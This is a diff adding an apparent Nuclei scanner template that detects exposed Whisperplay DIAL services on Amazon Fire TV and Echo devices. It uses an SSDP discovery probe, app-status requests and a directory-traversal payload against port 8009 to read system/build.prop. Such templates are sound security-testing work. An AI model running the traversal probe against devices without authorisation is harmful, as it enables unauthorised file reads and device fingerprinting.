@@ -1,0 +1,112 @@
+id: amazon-whisperplay-dial-recon
+
+info:
+  name: Amazon Fire TV / Alexa Whisperplay DIAL Exposure & SSDP Discovery
+  author: Mithun
+  severity: medium
+  description: |
+    Detects exposed Whisperplay DIAL (Discovery and Launch) services (Port 8009) on Amazon Fire OS and Echo devices.
+    Actively probes for local application enumeration, hidden system endpoints, and the root directory LFI/Traversal glitch.
+    Integrates custom UDP SSDP multicast discovery logic based on firetv.py.
+  reference:
+    - https://dial-multiscreen.org/
+  metadata:
+    max-request: 5
+    verified: true
+  tags: iot,amazon,firetv,dial,misconfig,lfi,ssdp,network
+
+# =====================================================================
+# STAGE 1: SSDP DISCOVERY (Based on firetv.py)
+# Sends the UDP multicast payload to port 1900 to trigger the DIAL response
+# =====================================================================
+network:
+  - inputs:
+      - data: "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nST: urn:dial-multiscreen-org:service:dial:1\r\nMX: 3\r\n\r\n"
+    host:
+      - "{{Hostname}}"
+    port: 1900
+    read-size: 2048
+    
+    matchers:
+      - type: word
+        name: ssdp-dial-response
+        part: data
+        words:
+          - "HTTP/1.1 200 OK"
+          - "LOCATION:"
+          - "urn:dial-multiscreen-org:service:dial:1"
+        condition: and
+        
+    extractors:
+      # Extracts the LOCATION header URL for the UPnP description
+      - type: regex
+        name: ssdp-location-url
+        part: data
+        group: 1
+        regex:
+          - "(?i)LOCATION:\\s*(.*)"
+
+# =====================================================================
+# STAGE 2: WHISPERPLAY DIAL ENUMERATION & EXPLOITATION
+# Probes Port 8009 for app status and directory traversal vulnerabilities
+# =====================================================================
+http:
+  - method: GET
+    path:
+      - "http://{{Host}}:8009/apps/system"
+      - "http://{{Host}}:8009/apps/Netflix"
+      - "http://{{Host}}:8009/"
+      - "http://{{Host}}:8009/../../../../system/build.prop"
+
+    stop-at-first-match: false
+    matchers-condition: or
+
+    matchers:
+      # Matcher 1: Detects standard DIAL XML schema exposure
+      - type: word
+        name: dial-service-exposed
+        part: body
+        words:
+          - 'urn:dial-multiscreen-org:schemas:dial'
+
+      # Matcher 2: Detects the root directory glitch you triggered earlier
+      - type: word
+        name: root-directory-leak
+        part: body
+        words:
+          - '<BASE HREF="file:/">'
+
+      # Matcher 3: Detects successful LFI/Traversal into the Fire OS build properties
+      - type: word
+        name: build-prop-leak
+        part: body
+        words:
+          - 'ro.build.version.fireos'
+          - 'ro.build.product'
+          - 'ro.hardware'
+        condition: or
+
+    extractors:
+      # Extracts the DIAL protocol version
+      - type: regex
+        name: dial-version
+        part: body
+        group: 1
+        regex:
+          - 'dialVer="([0-9.]+)"'
+
+      # Extracts whether the app is 'running', 'stopped', or 'hidden'
+      - type: regex
+        name: app-state
+        part: body
+        group: 1
+        regex:
+          - '<state>(.*?)<\/state>'
+          
+      # Extracts the exact Fire OS build version if the traversal works
+      - type: regex
+        name: fireos-version
+        part: body
+        group: 1
+        regex:
+          - 'ro\.build\.version\.name=(.*)'
